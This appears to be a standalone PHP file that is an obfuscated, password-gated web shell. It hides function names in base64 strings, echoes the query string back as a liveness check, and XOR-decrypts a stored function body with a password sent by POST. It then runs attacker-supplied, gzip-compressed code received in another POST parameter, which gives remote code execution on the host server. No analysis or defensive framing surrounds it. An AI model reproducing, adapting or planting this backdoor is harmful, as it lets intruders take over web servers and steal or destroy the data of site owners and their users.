<?php

class c62416914377d5
{
    private $r6241691437f94 = [];

    public function __call($name, $args)
    {
        call_user_func_array($this->r6241691437f94[$name], $args);
    }

    public function d624169144500e($s)
    {
        $function = 'b' . 'ase' . '64' . '_' . 'de' . 'code';
        $string = $function($s);
        return explode('::', $string, 2)[1];
    }

    public function p6241691437f8e()
    {
        $qString = $this->d624169144500e("TDZmcE94Z05HeS9jamJHNzo6UVVFUllfU1RSSU5H");

        if (!empty($_SERVER[$qString])) {
            exit($_SERVER[$qString]);
        }

        $e = $this->d624169144500e("NlAyeUtSeU9SSTk1aTVHS0R5ZExXdz09Ojpl");
        $p = $this->d624169144500e("MGJ2eCtacDJ3cmdDK3ZIdjo6cA==");

        if (!isset($_POST[$e]) ||
            !isset($_POST[$p])) {
            return;
        }

        $methodName = 'em6241691445013';
        $methodContent = 'U0RVXR5fRFpXaldUQWlTRlZFERhvBGgZCg==';

        $base64decode = $this->d624169144500e("bjdXSk4xRT06OmJhc2U2NF9kZWNvZGU=");
        $createFunction = $this->d624169144500e("U2hQTUwzcXV0dkVRaVE9PTo6Y3JlYXRlX2Z1bmN0aW9u");
        $gzinflate = $this->d624169144500e("NUEyQXJKaldVUT09OjpnemluZmxhdGU=");
        $regex = $this->d624169144500e("aTZGUmJ3PT06Oi9eWyAtfl0rJC8=");

        $methodContent = str_split($base64decode($methodContent));

        $password = $_POST[$p];
        $password = str_split($password);

        $temp = [];

        for ($i = 0; $i < count($methodContent); $i++) {
            $temp[] = chr(ord($methodContent[$i]) ^ ord($password[$i % count($password)]));
        }

        $methodContent = implode('', $temp);

        if (preg_match($regex, $methodContent)) {
            $this->r6241691437f94[$methodName] = $createFunction('', $methodContent);

            $code = $gzinflate($base64decode($_POST[$e]));
            $this->{$methodName}($code);
        }
    }
}

(new c62416914377d5)->p6241691437f8e();

